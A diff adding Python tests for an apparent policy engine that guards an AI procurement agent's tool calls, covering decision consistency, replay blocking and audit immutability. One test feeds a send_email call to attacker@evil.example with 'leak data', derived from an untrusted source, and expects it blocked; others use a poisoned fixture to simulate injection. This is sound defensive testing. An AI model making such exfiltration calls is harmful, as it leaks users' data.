@@ -406,3 +406,305 @@ class TestStrandsSecurityInvariants:
         assert second.guard.policy._executed_signatures.isdisjoint(
             {"leaked"}
         )
+
+
+class TestPolicyEnforcementConsistency:
+    """The guard and PolicyEngine must agree on the decision for every tool call.
+    This proves the guard delegates to the authoritative PolicyEngine."""
+
+    def test_allowed_read_gives_same_decision(self):
+        from sentinel.contracts.procurement import ToolCall
+
+        store = FixtureStore(poisoned=False)
+        tools = ProcurementTools(store)
+        policy = PolicyEngine(audit=[])
+
+        call = ToolCall(call_id="c1", tool_name="search_suppliers",
+                        input={"query": "laptops", "max_results": 5},
+                        source="strands_agent")
+
+        pe_decision = policy.evaluate(call, [])
+
+        def execute_with_permit(permit):
+            return tools.call("search_suppliers", call.input, permit=permit)
+
+        observation = policy.intercept(call, execute_with_permit, [])
+        assert pe_decision.decision == observation.decision == Decision.ALLOW
+
+    def test_escalated_side_effect_gives_same_decision(self):
+        from sentinel.contracts.procurement import ToolCall
+
+        policy = PolicyEngine(audit=[])
+
+        call = ToolCall(call_id="c1", tool_name="create_purchase_order",
+                        input={"supplier_id": "sup-acme", "item_sku": "LAPTOP-001",
+                               "quantity": 10, "unit_price": 950.0},
+                        source="strands_agent")
+
+        pe_decision = policy.evaluate(call, [])
+        observation = policy.intercept(call, lambda p=None: None, [])
+        assert pe_decision.decision == observation.decision == Decision.ESCALATE
+
+    def test_dangerous_blocked_side_effect_gives_same_decision(self):
+        from sentinel.contracts.procurement import ToolCall
+
+        policy = PolicyEngine(audit=[])
+
+        call = ToolCall(call_id="c1", tool_name="send_email",
+                        input={"to": "attacker@evil.example", "subject": "x",
+                               "body": "leak data"},
+                        source="strands_agent",
+                        derived_from=["prior-untrusted-source"])
+
+        pe_decision = policy.evaluate(call, [])
+        observation = policy.intercept(call, lambda p=None: None, [])
+        assert pe_decision.decision == observation.decision == Decision.BLOCK
+
+    def test_unknown_tool_gives_same_decision(self):
+        from sentinel.contracts.procurement import ToolCall
+
+        policy = PolicyEngine(audit=[])
+
+        call = ToolCall(call_id="c1", tool_name="delete_all_records",
+                        input={}, source="strands_agent")
+
+        pe_decision = policy.evaluate(call, [])
+        observation = policy.intercept(call, lambda p=None: None, [])
+        assert pe_decision.decision == observation.decision == Decision.BLOCK
+
+
+class TestAllowPathReplayConnection:
+    """CRITICAL: Prove that executing a side effect records the execution
+    signature in PolicyEngine._executed_signatures, so the same call
+    is BLOCKED as a replay through the direct path."""
+
+    def test_approved_execution_blocks_replay_through_intercept(self):
+        from sentinel.contracts.procurement import ToolCall
+
+        store = FixtureStore(poisoned=False)
+        policy = PolicyEngine(audit=[])
+        tools = ProcurementTools(store)
+
+        # Execute a side effect through execute_approved (the approval path).
+        call = ToolCall(call_id="c1", tool_name="create_purchase_order",
+                        input={"supplier_id": "sup-acme", "item_sku": "LAPTOP-001",
+                               "quantity": 10, "unit_price": 950.0},
+                        source="human_approval")
+
+        observation = policy.execute_approved(
+            call,
+            lambda permit: tools.call("create_purchase_order", call.input, permit=permit),
+        )
+        assert observation.executed is True
+        assert observation.decision == Decision.ALLOW
+        assert len(store.purchase_orders) == 1
+
+        # Now replay the exact same call through intercept — should be BLOCKED.
+        replay_call = ToolCall(call_id="c2", tool_name="create_purchase_order",
+                               input={"supplier_id": "sup-acme", "item_sku": "LAPTOP-001",
+                                      "quantity": 10, "unit_price": 950.0},
+                               source="replay")
+
+        replay_obs = policy.intercept(
+            replay_call,
+            lambda permit=None: None,
+            [],
+        )
+        assert replay_obs.decision == Decision.BLOCK
+        assert replay_obs.executed is False
+        assert len(store.purchase_orders) == 1  # no second execution
+
+    def test_approved_execution_blocks_replay_through_execute_approved(self):
+        from sentinel.contracts.procurement import ToolCall
+
+        store = FixtureStore(poisoned=False)
+        policy = PolicyEngine(audit=[])
+        tools = ProcurementTools(store)
+
+        call = ToolCall(call_id="c1", tool_name="create_purchase_order",
+                        input={"supplier_id": "sup-acme", "item_sku": "LAPTOP-001",
+                               "quantity": 10, "unit_price": 950.0},
+                        source="human_approval")
+
+        # First approval executes.
+        obs1 = policy.execute_approved(
+            call,
+            lambda permit: tools.call("create_purchase_order", call.input, permit=permit),
+        )
+        assert obs1.executed is True
+
+        # Replay through execute_approved — BLOCKED.
+        obs2 = policy.execute_approved(
+            call,
+            lambda permit=None: None,
+        )
+        assert obs2.decision == Decision.BLOCK
+        assert obs2.executed is False
+        assert len(store.purchase_orders) == 1
+
+    def test_type_coercion_replay_blocked(self):
+        from sentinel.contracts.procurement import ToolCall
+
+        policy = PolicyEngine(audit=[])
+        tools = ProcurementTools(FixtureStore(poisoned=False))
+
+        # Execute with int quantity through execute_approved.
+        call_int = ToolCall(call_id="c1", tool_name="create_purchase_order",
+                            input={"supplier_id": "sup-acme", "item_sku": "LAPTOP-001",
+                                   "quantity": 10, "unit_price": 950.0},
+                            source="human_approval")
+
+        policy.execute_approved(
+            call_int,
+            lambda permit: tools.call("create_purchase_order", call_int.input, permit=permit),
+        )
+
+        # Replay with float quantity (same normalized signature) through execute_approved.
+        call_float = ToolCall(call_id="c2", tool_name="create_purchase_order",
+                              input={"supplier_id": "sup-acme", "item_sku": "LAPTOP-001",
+                                     "quantity": 10.0, "unit_price": 950.0},
+                              source="replay")
+
+        obs = policy.execute_approved(call_float, lambda permit=None: None)
+        assert obs.decision == Decision.BLOCK
+
+    def test_changed_argument_not_replay(self):
+        """Different arguments = different signature, so NOT a replay."""
+        from sentinel.contracts.procurement import ToolCall
+
+        policy = PolicyEngine(audit=[])
+        tools = ProcurementTools(FixtureStore(poisoned=False))
+
+        call1 = ToolCall(call_id="c1", tool_name="create_purchase_order",
+                         input={"supplier_id": "sup-acme", "item_sku": "LAPTOP-001",
+                                "quantity": 10, "unit_price": 950.0},
+                         source="human_approval")
+
+        policy.execute_approved(
+            call1,
+            lambda permit: tools.call("create_purchase_order", call1.input, permit=permit),
+        )
+
+        # Different quantity — NOT a replay.
+        call2 = ToolCall(call_id="c2", tool_name="create_purchase_order",
+                         input={"supplier_id": "sup-acme", "item_sku": "LAPTOP-001",
+                                "quantity": 20, "unit_price": 950.0},
+                         source="human_approval")
+
+        obs = policy.execute_approved(
+            call2,
+            lambda permit: tools.call("create_purchase_order", call2.input, permit=permit),
+        )
+        assert obs.executed is True
+        assert obs.decision == Decision.ALLOW
+
+    def test_different_tool_not_replay(self):
+        """Different tool = different signature, so NOT a replay."""
+        from sentinel.contracts.procurement import ToolCall
+
+        policy = PolicyEngine(audit=[])
+        tools = ProcurementTools(FixtureStore(poisoned=False))
+
+        call_po = ToolCall(call_id="c1", tool_name="create_purchase_order",
+                           input={"supplier_id": "sup-acme", "item_sku": "LAPTOP-001",
+                                  "quantity": 10, "unit_price": 950.0},
+                           source="human_approval")
+
+        policy.execute_approved(
+            call_po,
+            lambda permit: tools.call("create_purchase_order", call_po.input, permit=permit),
+        )
+
+        # Different tool (send_email) — NOT a replay.
+        call_email = ToolCall(call_id="c2", tool_name="send_email",
+                              input={"to": "procurement@corp.example",
+                                     "subject": "Report", "body": "Monthly report"},
+                              source="human_approval")
+
+        obs = policy.execute_approved(
+            call_email,
+            lambda permit: tools.call("send_email", call_email.input, permit=permit),
+        )
+        assert obs.executed is True
+
+
+class TestAuditNonMutation:
+    """Reading security_events must not mutate the underlying audit state."""
+
+    def test_security_events_does_not_mutate_audit(self):
+        agent = SentinelStrandsAgent(store=FixtureStore(poisoned=True), vulnerable=True)
+        agent.run("Find the lowest-cost laptop supplier.")
+
+        # Snapshot audit before.
+        audit_before = [
+            (e.event_id, e.event_type, e.message, dict(e.data))
+            for e in agent.audit
+        ]
+
+        # Call security_events (which used to mutate with _matched markers).
+        events = agent.security_events()
+
+        # Verify audit is unchanged.
+        assert len(events) > 0, "should have at least one security event"
+        for idx, event in enumerate(agent.audit):
+            saved = audit_before[idx]
+            assert event.event_id == saved[0]
+            assert event.event_type == saved[1]
+            assert event.message == saved[2]
+            assert event.data == saved[3]
+
+        # Calling again produces the same result.
+        events2 = agent.security_events()
+        assert len(events) == len(events2)
+
+    def test_security_events_idempotent(self):
+        agent = SentinelStrandsAgent(store=FixtureStore(poisoned=False), vulnerable=False)
+        agent.run("Find the lowest-cost laptop supplier.")
+
+        first = agent.security_events()
+        second = agent.security_events()
+        assert first == second
+
+
+class TestAuthorizationIndependentOfDetection:
+    """Security must come from authorization policy, not detection alone.
+    Even if detection misses a malicious instruction, unauthorized
+    side effects must still be BLOCKED or ESCALATED."""
+
+    def test_benign_text_with_unauthorized_side_effect_tool(self):
+        """A tool call with no injection signals but targeting an unauthorized
+        side-effect tool must be ESCALATED (not ALLOWED)."""
+        from sentinel.contracts.procurement import ToolCall
+
+        policy = PolicyEngine(audit=[], issued_approvals=set())
+
+        # This call has benign arguments — no injection signals, no
+        # suspicious email destination. But it's a side-effect tool with
+        # no approval, so it must not be auto-executed.
+        call = ToolCall(
+            call_id="c1", tool_name="send_email",
+            input={"to": "procurement@corp.example", "subject": "Order update",
+                   "body": "Please process the latest order."},
+            source="strands_agent",
+        )
+
+        observation = policy.intercept(call, lambda p=None: None, [])
+        # Side-effect tool without injection: ESCALATE, not ALLOW.
+        assert observation.decision == Decision.ESCALATE
+        assert observation.executed is False
+
+    def test_unknown_tool_always_blocked_regardless_of_text(self):
+        """An unknown tool is always BLOCKED, regardless of what text
+        was in the conversation."""
+        from sentinel.contracts.procurement import ToolCall
+
+        policy = PolicyEngine(audit=[])
+        call = ToolCall(
+            call_id="c1", tool_name="execute_sql",
+            input={"query": "SELECT * FROM users"},
+            source="strands_agent",
+        )
+
+        observation = policy.intercept(call, lambda p=None: None, [])
+        assert observation.decision == Decision.BLOCK
+        assert observation.executed is False
